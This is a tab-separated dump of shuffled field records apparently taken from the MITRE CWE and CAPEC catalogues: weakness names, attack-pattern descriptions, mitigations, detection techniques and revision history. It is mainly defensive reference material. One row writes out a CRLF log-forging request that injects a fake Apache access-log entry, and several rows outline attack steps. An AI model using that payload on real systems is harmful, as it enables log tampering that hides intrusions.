15723	77	Dynamic Analysis with Manual Results Interpretation
6152	62	updated Relationships, Taxonomy_Mappings
25320	91	Build and Compilation
7801	21	7 Pernicious Kingdoms
12802	28	CWE Content Team
25198	48	02
21994	63	Bypass Protection Mechanism
23939	63	Read Application Data
15749	42	Require that the user properly answers the security question prior to resetting their password and sending the new password to the e-mail address of record.
9195	39	2017-11-08
19220	26	Implementation
23710	28	CWE Content Team
14827	39	2008-11-24
23806	28	CWE Content Team
9590	56	ChildOf
18195	28	CWE Content Team
12978	40	The target host does insecure temporary file creation.
15563	28	CWE Content Team
19605	92	Explore
16638	101	CAPEC Content Team
8208	35	MITRE
10581	39	2012-05-11
11645	38	Too many exceptions generated by the application as a result of malformed XPath queries
20043	102	ChildOf
14037	35	MITRE
23699	28	CWE Content Team
13400	101	CAPEC Content Team
9319	62	updated Applicable_Platforms, Causal_Nature
9231	69	Draft
24088	91	Architecture and Design
18399	26	Implementation
8581	31	1000
20102	91	Implementation
18490	39	2012-10-30
5996	103	Primary
18155	103	Primary
18673	62	updated Common_Consequences, Demonstrative_Examples, References, Relationships
8843	62	updated Relationships, Taxonomy_Mappings, White_Box_Definitions
23263	50	Limit the amount of resources that are accessible to unprivileged users.
17562	54	Medium
11230	85	299
18125	63	Bypass Protection Mechanism
22925	91	Implementation
11863	26	Architecture and Design
6952	90	Language-Independent
20096	85	110
25410	62	updated Demonstrative_Examples, Relationships
25288	88	Returning a Mutable Object to an Untrusted Caller
22186	76	2018-07-31
18818	28	CWE Content Team
15063	36	http://phrack.org/issues/51/11.html
11125	31	699
18400	39	2019-01-03
11983	35	MITRE
21132	89	Meta
19951	55	Seamus Tuohy
5753	71	2005
12483	39	2013-02-21
12472	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners
13133	61	Draft
20059	73	Indirectly through injection, use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry.                   For example: The HTTP request for "/index.html%0A%0DIP_ADDRESS- - DATE_FORMAT] "GET /forged-path HTTP/1.1" 200 - "-" USER_AGENT" may add the log line into Apache "access_log" (for example). Different applications may require different encodings of the carriage return and line feed characters.
17056	24	MITRE
11931	71	2009
21375	35	MITRE
19417	39	2019-01-03
12389	96	2018-07-02
23245	46	This issue can make the software perform more slowly by retaining memory and/or other resources longer than necessary.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.
13240	54	Medium
20791	62	updated Demonstrative_Examples, Potential_Mitigations, Relationships
18034	35	MITRE
6279	86	https://media.blackhat.com/bh-us-12/Briefings/Serna/BH_US_12_Serna_Leak_Era_Slides.pdf
16045	66	Password Storage Cheat Sheet
21454	51	2015-11-09
18298	28	CWE Content Team
18109	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
20140	62	updated Demonstrative_Examples, Potential_Mitigations
13713	100	The MITRE Corporation
9084	28	CWE Content Team
10248	39	2010-09-27
11729	62	updated Related_Attack_Patterns
17850	39	2014-06-23
11856	62	updated Relationships
21423	35	MITRE
23352	62	added/updated demonstrative examples
10814	23	A product inherits a set of insecure permissions for an object, e.g. when copying from an archive file, without user awareness or involvement.
24031	28	CWE Content Team
11969	28	CWE Content Team
21564	39	2008-10-14
19832	73	Inject context-appropriate malicious file path using network packet injection tools (netcat, nemesis, etc.)
5870	102	ChildOf
18179	72	The case of an omitted null character is the most dangerous of the possible issues. This will almost certainly result in information disclosure, and possibly a buffer overflow condition, which may be exploited to execute arbitrary code.
23210	76	2019-04-04
7823	63	Execute Unauthorized Code or Commands
13398	28	CWE Content Team
7432	51	2014-06-23
21921	21	CWE Content Team
12501	63	Varies by Context
6899	28	Eric Dalci
9282	30	Artur Maj
8684	23	In this attack scenario, the attacker imitates a cellular base station with his own "rogue" base station equipment. Since cellular devices connect to whatever station has the strongest signal, the attacker can easily convince a targeted cellular device (e.g. the retransmission device) to talk to the rogue base station.
8219	90	Language-Independent
24672	55	CAPEC Content Team
9006	69	Draft
16968	39	2008-09-08
20876	81	Access Control
23078	45	Base
22857	100	The MITRE Corporation
11491	62	updated Common_Consequences, Demonstrative_Examples, Potential_Mitigations, Related_Attack_Patterns, Relationships
19745	81	Other
8307	50	Implement intelligent password throttling mechanisms such as those which take IP address into account, in addition to the login name.
17060	59	Updated Related_Attack_Patterns
23891	62	updated Description
6922	28	CWE Content Team
13216	35	MITRE
6789	72	Dead code that results from code that can never be executed is an indication of problems with the source code that needs to be fixed and is an indication of poor quality.
15991	28	CWE Content Team
25387	40	Target software must be a client that allows scripting communication from remote hosts.
14445	85	473
10663	28	CWE Content Team
8436	42	Ensure that you validate all form fields. If a field is unused, it is still important to constrain it so that it is empty or undefined.
8904	59	Updated Related_Attack_Patterns
6381	33	Wikipedia
15006	28	CWE Content Team
9843	69	Incomplete
23899	102	ChildOf
12628	69	Incomplete
22376	39	2017-11-08
8959	104	796
16263	31	1000
5698	35	MITRE
8782	23	An attacker exploits characteristics of the infrastructure of a network entity in order to perpetrate attacks or information gathering on network objects or effect a change in the ordinary information flow between network objects. Most often, this involves manipulation of the routing of network messages so, instead of arriving at their proper destination, they are directed towards an entity of the attackers' choosing, usually a server controlled by the attacker. The victim is often unaware that their messages are not being processed correctly. For example, a targeted client may believe they are connecting to their own bank but, in fact, be connecting to a Pharming site controlled by the attacker which then collects the user's login information in order to hijack the actual bank account.
15433	35	MITRE
21571	80	To bypass the access control of the directory of listings
12579	28	CWE Content Team
13013	74	4
16691	91	Architecture and Design
22215	21	PLOVER
6106	28	CWE Content Team
12422	23	The web application produces links to untrusted external sites outside of its sphere of control, but it does not properly prevent the external site from modifying  security-critical properties of the window.opener object, such as the location property.
10907	62	updated Demonstrative_Examples
21421	47	Unreliable Execution
9188	39	2008-09-08
13804	28	CWE Content Team
5582	35	MITRE
10368	39	2011-03-29
22339	89	Standard
16924	35	MITRE
16802	100	The MITRE Corporation
5975	72	Without a checksum it is impossible to determine if any changes have been made to the data after it was sent.
7310	79	Confidentiality
14844	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
11293	73	If directories are discovered that are native to a server type further refine the directory search to include directories usually present on those types of servers.
21638	35	MITRE
9250	31	1000
15232	102	CanPrecede
5656	35	MITRE
7740	28	CWE Content Team
17103	31	1000
8898	39	2014-06-23
22053	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
7101	27	An attacker will need tools to sniff existing credentials (possibly their own) in order to retrieve a base credential for modification. They will need to understand how the components of the credential affect server behavior and how to manipulate this behavior by changing the credential. Finally, they will need tools to allow them to craft and transmit a modified credential.
7687	62	updated Description, Maintenance_Notes, Relationships
10832	62	updated Common_Consequences
7843	28	CWE Content Team
19556	62	updated Common_Consequences
12681	24	MITRE
15723	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Debugger
17060	101	CAPEC Content Team
9718	39	2010-06-21
13579	70	DNS Threats and DNS Weaknesses
8826	26	Implementation
6562	76	2019-09-30
5722	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
16451	28	CWE Content Team
15023	62	updated Relationships
18760	35	MITRE
15091	59	Updated Description, Description Summary, References, Related_Weaknesses
23602	25	Low
17909	51	2014-06-23
20068	28	CWE Content Team
20291	35	MITRE
5640	95	Upon successful hijacking, the attacker enjoys elevated privileges, and can possibly have the hijacked thread do his bidding
20292	25	Low
9636	103	Primary
9101	59	Updated Related_Attack_Patterns
7874	53	The MITRE Corporation
11172	50	Implementation: Scan dynamically generated content against validation specification
8222	70	How Computer Viruses Work
14795	28	CWE Content Team
10946	54	Medium
13361	62	updated Demonstrative_Examples
23044	54	High
8098	53	The MITRE Corporation
13825	62	updated References, Relationships
12892	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Network Sniffer                                                                     Cost effective for partial coverage:                                                                           Fuzz Tester                            Framework-based Fuzzer                            Automated Monitored Execution                            Man-in-the-middle attack tool
23508	39	2014-02-18
16648	56	ChildOf
15379	97	Influence Perception of Reciprocation
17046	53	The MITRE Corporation
22232	62	updated Applicable_Platforms, Type
10247	62	updated Detection_Factors
13229	80	An attacker must be able to craft two X.509 certificates that produce the same MD5 hash
8868	39	2009-03-10
14883	28	Eric Dalci
19032	21	CLASP
21199	66	An Introduction to OpenSSL Programming (Part I)
19433	62	updated Description, Relationships, Weakness_Ordinalities
7750	39	2014-07-30
8959	88	Only Filtering Special Elements Relative to a Marker
10878	94	Run Arbitrary Code
8585	31	1000
6303	62	updated Description, Name
7244	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis                            Binary Weakness Analysis - including disassembler + source code weakness analysis
20755	52	Some instances of improper input validation can be detected using automated static analysis.                   A static analysis tool might allow the user to specify which application-specific methods or functions perform input validation; the tool might also have built-in knowledge of validation frameworks such as Struts. The tool may then suppress or de-prioritize any associated warnings. This allows the analyst to focus on areas of the software in which input validation does not appear to be present.                   Except in the cases described in the previous paragraph, automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes.
12565	63	Other
20651	39	2017-11-08
23521	28	CWE Content Team
10930	28	CWE Content Team
7006	28	CWE Content Team
16726	47	Read Data
18397	50	Remember to understand how to use the data access methods generated by the ORM tool / framework properly in a way that would leverage the built-in security mechanisms of the framework
23723	85	174
7058	39	2008-07-01
7191	28	CWE Content Team
13538	56	ChildOf
12958	88	Insufficient Logging
12822	91	Implementation
10696	54	Low
14053	28	CWE Content Team
11247	39	2011-09-13
10665	53	The MITRE Corporation
25155	63	Unexpected State
16380	39	2012-05-11
9028	56	ChildOf
10245	35	MITRE
22203	76	2018-07-31
13690	45	Class
10108	35	MITRE
13845	76	2017-05-01
12876	100	The MITRE Corporation
13003	100	The MITRE Corporation
16492	103	Primary
15872	76	2018-07-31
5697	28	CWE Content Team
24217	28	CWE Content Team
14014	26	Implementation
17095	81	Integrity
7010	62	updated Potential_Mitigations
5774	62	updated Modes_of_Introduction, Relationships
18713	104	921
11700	39	2008-09-08
16051	28	CWE Content Team
19156	88	Only Filtering Special Elements at an Absolute Position
19511	56	ChildOf
6305	28	CWE Content Team
18453	90	Assembly
10562	63	Read Application Data
16519	42	Perform thorough input validation (i.e.: server side validation) on the cookie data if you're going to use it for a security related decision.
23818	61	Stable
16770	35	MITRE
7513	90	C
21480	35	MITRE
18648	39	2011-06-27
20938	46	For example, an attacker might succeed in authentication by providing a small password that matches the associated portion of the larger, correct password.
24535	101	CAPEC Content Team
14671	39	2017-11-08
7449	60	09
13624	90	C++
24347	74	1
16301	100	The MITRE Corporation
18040	56	ChildOf
23746	104	593
24660	79	Confidentiality
14900	39	2009-01-12
21409	74	3
24026	39	2008-10-14
10635	35	MITRE
14125	21	7 Pernicious Kingdoms
22870	39	2012-05-11
22903	28	CWE Content Team
19174	56	ChildOf
18141	28	CWE Content Team
24027	56	ChildOf
22252	31	1000
22125	56	ChildOf
12919	101	CAPEC Content Team
23055	73	Use a spidering tool to follow and record all non-static links that are likely to have input parameters (through forms, URL, fragments, etc.) actively used by the Web application.
21657	43	Simple
21579	39	2008-09-08
15293	62	updated Relationships
20567	59	Updated Related_Attack_Patterns
13938	28	CWE Content Team
5915	46	Many password storage mechanisms compute a hash and store the hash, instead of storing the original password in plaintext. In this design, authentication involves accepting an incoming password, computing its hash, and comparing it to the stored hash.             Many hash algorithms are designed to execute quickly with minimal overhead, even cryptographic hashes. However, this efficiency is a problem for password storage, because it can reduce an attacker's workload for brute-force password cracking. If an attacker can obtain the hashes through some other method (such as SQL injection on a database that stores hashes), then the attacker can store the hashes offline and use various techniques to crack the passwords by computing hashes efficiently. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing (such as cloud computing) and GPU, ASIC, or FPGA hardware. In such a scenario, an efficient hash algorithm helps the attacker.             There are several properties of a hash scheme that are relevant to its strength against an offline, massively-parallel attack:                                                The amount of CPU time required to compute the hash ("stretching")                   The amount of memory required to compute the hash ("memory-hard" operations)                   Including a random value, along with the password, as input to the hash computation ("salting")                   Given a hash, there is no known way of determining an input (e.g., a password) that produces this hash value, other than by guessing possible inputs ("one-way" hashing)                   Relative to the number of all possible hashes that can be generated by the scheme, there is a low likelihood of producing the same hash for multiple different inputs ("collision resistance")                                          Note that the security requirements for the software may vary depending on the environment and the value of the passwords. Different schemes might not provide all of these properties, yet may still provide sufficient security for the environment. Conversely, a solution might be very strong in preserving one property, which still being very weak for an attack against another property, or it might not be able to significantly reduce the efficiency of a massively-parallel attack.
10147	62	updated Relationships, Other_Notes, Taxonomy_Mappings
23536	39	2010-02-16
17563	62	updated Potential_Mitigations, Time_of_Introduction
18939	35	MITRE
8403	103	Primary
6625	28	CWE Content Team
10809	77	Automated Dynamic Analysis
19368	76	2017-08-04
12587	39	2014-06-23
7403	62	updated Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, Potential_Mitigations
14734	103	Primary
22001	101	CAPEC Content Team
17602	29	1st Edition
7995	43	Simple
6398	79	Availability
6024	77	Manual Static Analysis - Source Code
12596	62	updated Potential_Mitigations, References
5710	62	updated Common_Consequences, Description
19193	35	MITRE
19936	35	MITRE
24233	79	Integrity
18610	22	07
23234	28	CWE Content Team
24547	62	updated Demonstrative_Examples
11233	21	CWE Content Team
21694	36	http://www.faqs.org/rfcs/rfc3629.html
11594	78	High
6914	62	updated Demonstrative_Examples, Observed_Examples, Related_Attack_Patterns, Relationships
16549	62	updated References
13927	28	CWE Content Team
18749	35	MITRE
18623	23	An adversary manipulates the files in a shared location by adding malicious programs, scripts, or exploit code to valid content. Once a user opens the shared content, the tainted content is executed.
16011	35	MITRE
10038	63	Read Application Data
15214	31	1000
6816	28	CWE Content Team
18853	21	CWE Content Team
10198	74	3
17300	35	MITRE
24582	73	Attacker triggers logged actions with maliciously crafted data as inputs, parameters, arguments, etc.
21576	35	MITRE
18468	39	2012-05-11
22305	92	Explore
7641	63	Gain Privileges or Assume Identity
9699	60	16
22040	97	Exploit Script-Based APIs
15669	35	MITRE
15447	23	An adversary exploits a weakness in authentication to install malware that alters the functionality and information provide by targeted operating system API calls. Often referred to as rootkits, it is often used to hide the presence of programs, files, network connections, services, drivers, and other system components.
5581	28	Eric Dalci
18928	28	CWE Content Team
21503	103	Primary
12024	33	Fortify
9870	28	CWE Content Team
10554	66	0x00 vs ASP file upload scripts
23081	56	ChildOf
9573	28	CWE Content Team
12449	62	updated Potential_Mitigations
11654	91	Implementation
15208	62	updated Demonstrative_Examples, Observed_Examples, Related_Attack_Patterns, Relationships, Taxonomy_Mappings
23585	35	MITRE
15856	69	Incomplete
13269	35	MITRE
15810	93	Limited
9623	46	NULL pointer dereference issues can occur through a number of flaws, including race conditions, and simple programming omissions.
18632	93	Defense in Depth
6896	39	2019-06-20
22486	76	2019-04-04
11041	104	568
20282	47	Gain Privileges
11789	35	MITRE
12131	31	1000
18841	54	High
13250	101	CAPEC Content Team
23589	103	Primary
20251	28	CWE Content Team
25019	35	MITRE
21572	59	Updated Related_Attack_Patterns
23689	43	Simple
12668	23	The product contains an assert() or similar statement that can be triggered by an attacker, which leads to an application exit or other behavior that is more severe than necessary.
15432	72	If privileges are not dropped, neither are access rights of the user. Often these rights can be prevented from being dropped.
11780	100	The MITRE Corporation
18073	31	699
6695	62	updated Description, Potential_Mitigations
13842	104	272
9075	69	Stable
15514	28	CWE Content Team
16543	67	Medium
8468	28	CWE Content Team
20454	26	Architecture and Design
18289	39	2012-10-30
9453	56	ChildOf
15591	35	MITRE
12075	63	Unexpected State
5737	35	MITRE
10734	103	Primary
11154	28	CWE Content Team
19206	28	CWE Content Team
12547	28	CWE Content Team
22906	63	Read Application Data
19585	57	Indirect
19273	50	Design: Ship client-side application with integrity checks (code signing) when possible.
24586	28	CWE Content Team
9769	69	Incomplete
20088	62	updated Potential_Mitigations
13825	39	2012-05-11
23611	53	The MITRE Corporation
23964	35	MITRE
11535	81	Integrity
19361	39	2010-12-13
23082	28	CWE Content Team
13176	28	CWE Content Team
24327	103	Primary
16543	43	Simple
21916	90	Language-Independent
6329	63	DoS: Resource Consumption (Memory)
19074	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
21692	23	This attack pattern combines malicious Javascript and a legitimate webpage loaded into a concealed iframe. The malicious Javascript is then able to interact with a legitimate webpage in a manner that is unknown to the user. This attack usually leverages some element of social engineering in that an attacker must convinces a user to visit a web page that the attacker controls.
9559	22	05
19958	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
19978	45	Base
24755	35	MITRE
16749	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners
7104	55	CAPEC Content Team
12098	39	2013-02-21
19988	56	ChildOf
6400	39	2019-06-20
24392	54	High
15249	35	MITRE
23858	102	ChildOf
19811	63	Modify Application Data
13312	88	Null Byte Interaction Error (Poison Null Byte)
13139	28	CWE Content Team
7308	86	https://www.exploit-db.com/docs/17881.pdf
22587	30	Robert Hansen
11393	62	updated Observed_Examples, References, Relationships
23588	39	2009-07-27
12958	69	Draft
17560	55	CAPEC Content Team
10659	31	1000
9695	39	2008-09-08
9209	46	During the execution of a signal handler, it can be interrupted by another handler when a different signal is sent. If the two handlers share state - such as global variables - then an attacker can corrupt the state by sending another signal before the first handler has completed execution.
14252	35	MITRE
17898	39	2012-05-11
14257	88	Inconsistent Interpretation of HTTP Requests ('HTTP Request Smuggling')
23866	89	Detailed
11781	104	1083
11388	28	CWE Content Team
21343	39	2012-05-11
24041	56	PeerOf
7238	28	Eric Dalci
7420	31	1000
7932	39	2008-07-01
17822	52	Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.                   Attach the monitor to the process and look for library functions that indicate when randomness is being used. Run the process multiple times to see if the seed changes. Look for accesses of devices or equivalent resources that are commonly used for strong (or weak) randomness, such as /dev/urandom on Linux. Look for library or system calls that access predictable information such as process IDs and system time.
19078	87	Database Server
9497	31	1000
17080	81	Access Control
6389	28	CWE Content Team
11929	62	updated Common_Consequences, Other_Notes
22016	101	CAPEC Content Team
6311	103	Primary
6248	62	updated Description, Potential_Mitigations
10036	43	Simple
24485	62	updated Relationships
21160	104	600
9922	101	CAPEC Content Team
19799	91	Implementation
10054	62	updated Relationships
6943	43	Simple
14397	103	Primary
7759	56	ChildOf
9765	28	CWE Content Team
9359	62	updated Related_Attack_Patterns, Relationships
8725	35	MITRE
24865	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, References, Related_Weaknesses, Typical_Likelihood_of_Exploit, Typical_Severity
21773	62	updated Relationships
20749	76	2018-07-31
25004	90	Language-Independent
16948	62	updated Potential_Mitigations, Time_of_Introduction
11845	81	Access Control
12476	28	CWE Content Team
5686	63	Reduce Maintainability
5709	23	A software system that accepts path input in the form of asterisk wildcard ('filedir*') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.
19451	51	2014-06-23
20107	39	2017-11-08
17739	27	Probing requires the ability to interactively send and receive data from a target, whereas passive listening requires a sufficient understanding of the protocol to analyze a preexisting channel of communication.
10696	23	An attacker, armed with the cipher text and the encryption algorithm used, performs an exhaustive (brute force) search on the key space to determine the key that decrypts the cipher text to obtain the plaintext.
6174	23	An attacker hosts or joins an event or transaction within an application framework in order to change the content of messages or items that are being exchanged. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, substitute one item or another, spoof an existing item and conduct a false exchange, or otherwise change the amounts or identity of what is being exchanged. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system in order to change the content of various application elements. Often, items exchanged in game can be monetized via sales for coin, virtual dollars, etc. The purpose of the attack is for the attack to scam the victim by trapping the data packets involved the exchange and altering the integrity of the transfer process.
11570	62	updated Time_of_Introduction
5739	35	MITRE
14829	33	Troy Hunt
16662	46	Padding schemes are often used with cryptographic algorithms to make the plaintext less predictable and complicate attack efforts. The OAEP scheme is often used with RSA to nullify the impact of predictable common text.
9493	62	updated Description, Name, Type
17166	35	MITRE
15450	88	Path Traversal: '/../filedir'
18033	59	Updated Attack_Phases
7552	23	The product or code uses machine-dependent functionality, but      it does not sufficiently encapsulate or isolate this functionality from      the rest of the code.
14876	51	2015-11-09
6149	62	updated Causal_Nature, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings
16641	28	CWE Content Team
20101	62	updated Relationships
24630	56	ChildOf
21161	62	updated Relationships
12967	76	2018-07-31
11404	62	updated Potential_Mitigations
10919	39	2017-11-08
7912	62	updated Relationships
8075	66	The World Wide Web Security FAQ
9876	42	Remove the unused Validation Form from the validation.xml file.
9630	21	CWE Content Team
15252	39	2008-10-14
5942	39	2011-09-13
6527	28	Eric Dalci
20693	57	Primary
15717	92	Experiment
21542	103	Primary
17255	39	2008-09-08
14936	43	Simple
24447	23	The code uses a function that has inconsistent implementations across operating systems and versions.
24828	62	updated Related_Attack_Patterns, Relationships
20685	62	updated Applicable_Platforms
25074	79	Authorization
23120	62	updated Time_of_Introduction
22129	35	MITRE
20424	35	MITRE
9876	91	Implementation
14144	39	2014-02-18
14358	58	Many interpreted languages support the use of a "$$varname" construct to set a variable whose name is specified by the $varname variable. In PHP, these are referred to as "variable variables." Functions might also be invoked using similar syntax, such as $$funcname(arg1, arg2).
20070	88	Path Equivalence: '\multiple\\internal\backslash'
16155	28	CWE Content Team
15188	74	2
15532	56	PeerOf
24212	62	updated Time_of_Introduction
15878	35	MITRE
6398	47	Execute Unauthorized Commands
24107	77	Dynamic Analysis with Manual Results Interpretation
20850	62	updated Potential_Mitigations
18223	35	MITRE
19942	81	Other
8655	46	When an exception is not caught, it may cause the program to crash or expose sensitive information.
24237	39	2008-09-08
18001	50	Configure your firewall to block egress ICMP messages.
9099	39	2008-09-08
12990	35	MITRE
7698	76	2019-04-04
24768	35	MITRE
16913	48	03
24113	27	The attacker must be able to craft malformed SOAP messages, specifically, messages with arrays where the stated array size understates the actual size of the array in the message.
5784	23	An adversary adds malicious logic, often in the form of a computer virus, to otherwise benign software. This logic is often hidden from the user of the software and works behind the scenes to achieve negative impacts. Many times, the malicious logic is inserted into empty space between legitimate code, and is then called when the software is executed. This pattern of attack focuses on software already fielded and used in operation as opposed to software that is still under development and part of the supply chain.
12922	39	2014-07-30
5800	23	An adversary gains access to an application, service, or device with the privileges of an authorized or privileged user by escaping the confines of a virtualized environment. The adversary is then able to access resources or execute unauthorized code within the host environment, generally with the privileges of the user running the virtualized process. Successfully executing an attack of this type is often the first step in executing more complex attacks.
11598	39	2011-06-01
17040	91	Implementation
19752	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
14023	39	2013-07-17
21116	53	The MITRE Corporation
6595	62	updated Applicable_Platforms, Demonstrative_Examples, Description, Name, Observed_Examples, Potential_Mitigations, Terminology_Notes
7386	31	1000
6864	101	CAPEC Content Team
22490	28	CWE Content Team
11718	90	Language-Independent
11680	56	ChildOf
11394	56	ChildOf
14221	56	ChildOf
13817	46	The software may have a fixed list of special characters it believes is complete. However, there may be alternate encodings, or representations that also have the same meaning. For example, the software may filter out a leading slash (/) to prevent absolute path names, but does not account for a tilde (~) followed by a user name, which on some *nix systems could be expanded to an absolute pathname. Alternately, the software might filter a dangerous "-e" command-line switch when calling an external program, but it might not account for "--exec" or other switches that have the same semantics.
9691	67	Low
15946	35	MITRE
13119	28	CWE Content Team
24549	35	MITRE
7085	47	Read Data
9256	103	Primary
23738	23	A product calculates or uses an incorrect maximum or minimum value that is 1 more, or 1 less, than the correct value.
7100	63	Reduce Performance
9775	39	2017-11-08
9174	59	Updated Related_Weaknesses
18814	39	2011-03-29
9109	63	Modify Application Data
13831	63	DoS: Crash, Exit, or Restart
16017	42	Declare the method private.
25399	39	2008-09-08
7184	35	MITRE
14065	44	SOAR Partial
6727	39	2017-11-08
20258	32	Insecure.com LLC
11364	39	2019-06-20
12879	76	2017-08-04
24087	103	Primary
12920	88	Access of Resource Using Incompatible Type ('Type Confusion')
13210	62	updated Relationships, Taxonomy_Mappings
10843	56	ChildOf
10042	23	The code uses an operator for assignment when the intention was to perform a comparison.
8055	35	MITRE
15126	101	CAPEC Content Team
20303	28	CWE Content Team
8597	28	CWE Content Team
10111	50	Assess software and software components during development and prior to deployment to ensure that they function as intended and without any malicious functionality.
15478	81	Access Control
24469	31	699
25067	23	The software contains code that is designed to disrupt the legitimate operation of the software (or its environment) when a certain time passes, or when a certain logical condition is met.
10464	39	2008-09-08
9474	28	CWE Content Team
22286	85	3
10498	28	Eric Dalci
11361	28	CWE Content Team
15096	81	Other
9572	47	Unreliable Execution
7175	62	updated Potential_Mitigations, Time_of_Introduction
24180	50	The exact response required from an UTF-8 decoder on invalid input is not uniformly defined by the standards. In general, there are several ways a UTF-8 decoder might behave in the event of an invalid byte sequence:                                                         1. Insert a replacement character (e.g. '?', '').                      2. Ignore the bytes.                      3. Interpret the bytes according to a different character encoding (often the ISO-8859-1 character map).                      4. Not notice and decode as if the bytes were some similar bit of UTF-8.                      5. Stop decoding and report an error (possibly giving the caller the option to continue).                                                   It is possible for a decoder to behave in different ways for different types of invalid input.                RFC 3629 only requires that UTF-8 decoders must not decode "overlong sequences" (where a character is encoded in more bytes than needed but still adheres to the forms above). The Unicode Standard requires a Unicode-compliant decoder to "...treat any ill-formed code unit sequence as an error condition. This guarantees that it will neither interpret nor emit an ill-formed code unit sequence."                Overlong forms are one of the most troublesome types of UTF-8 data. The current RFC says they must not be decoded but older specifications for UTF-8 only gave a warning and many simpler decoders will happily decode them. Overlong forms have been used to bypass security validations in high profile products including Microsoft's IIS web server. Therefore, great care must be taken to avoid security issues if validation is performed before conversion from UTF-8, and it is generally much simpler to handle overlong forms before any input validation is done.                To maintain security in the case of invalid input, there are two options. The first is to decode the UTF-8 before doing any input validation checks. The second is to use a decoder that, in the event of invalid input, returns either an error or text that the application considers to be harmless. Another possibility is to avoid conversion out of UTF-8 altogether but this relies on any other software that the data is passed to safely handling the invalid data.                Another consideration is error recovery. To guarantee correct recovery after corrupt or lost bytes, decoders must be able to recognize the difference between lead and trail bytes, rather than just assuming that bytes will be of the type allowed in their position.
13725	85	510
12034	39	2014-07-30
12439	43	Simple
12724	100	The MITRE Corporation
19844	90	Language-Independent
18613	104	765
23098	102	PeerOf
15511	62	updated Potential_Mitigations
15379	61	Draft
16259	62	updated Potential_Mitigations, Time_of_Introduction
21460	40	Advanced knowledge about the installed target system design.
17905	62	updated Potential_Mitigations
8111	39	2010-12-13
21470	62	updated Observed_Examples, Relationships
12875	28	CWE Content Team
16091	31	1000
9149	35	MITRE
20401	72	An attacker could include dangerous input that bypasses validation protection mechanisms which can be used to launch various attacks including injection attacks, execute arbitrary code or cause other unintended behavior.
18559	90	Language-Independent
14446	42	Properly use provided input validation frameworks.
25106	35	MITRE
13283	49	2012
19807	70	The OWASP Application Security Desk Reference
19903	39	2019-01-03
17506	21	CWE Content Team
8960	62	updated Relationships, Taxonomy_Mappings
9737	62	updated Common_Consequences
14358	69	Incomplete
19140	74	1
8597	62	updated Relationships
21716	78	Medium
17191	25	High
8329	88	Exposure of Access Control List Files to an Unauthorized Control Sphere
16576	35	MITRE
14185	35	MITRE
18018	46	This issue makes it more difficult to understand and/or maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.    Whilte the interpetation of "too many lines of code" may vary for each product or developer, CISQ recommends a default threshold value of 1000.
25434	39	2009-10-29
9316	23	The web application does not filter user-controlled input for executable script disguised using doubling of the involved characters.
12235	28	CWE Content Team
12200	62	updated Relationships, Taxonomy_Mappings
22764	62	updated Related_Attack_Patterns, Relationships
10310	35	MITRE
12765	62	updated Relationships
6882	39	2017-11-08
15669	28	CWE Content Team
9926	76	2018-07-31
17359	81	Access Control
20054	81	Access Control
15872	101	CAPEC Content Team
14223	35	MITRE
13798	42	Ensure that a failure or an error will not leave a system in a state where privileges are not properly shed and privilege escalation is possible (i.e. fail securely with regards to handling of privileges).
23583	28	CWE Content Team
14358	88	Dynamic Variable Evaluation
8069	31	1000
19786	94	Denial of Service
23585	39	2011-06-01
17713	86	http://blogs.msdn.com/b/aspnetue/archive/2010/09/17/second_2d00_post.aspx
5815	51	2014-06-23
14760	35	MITRE
15679	31	1000
8130	79	Confidentiality
9827	24	MITRE
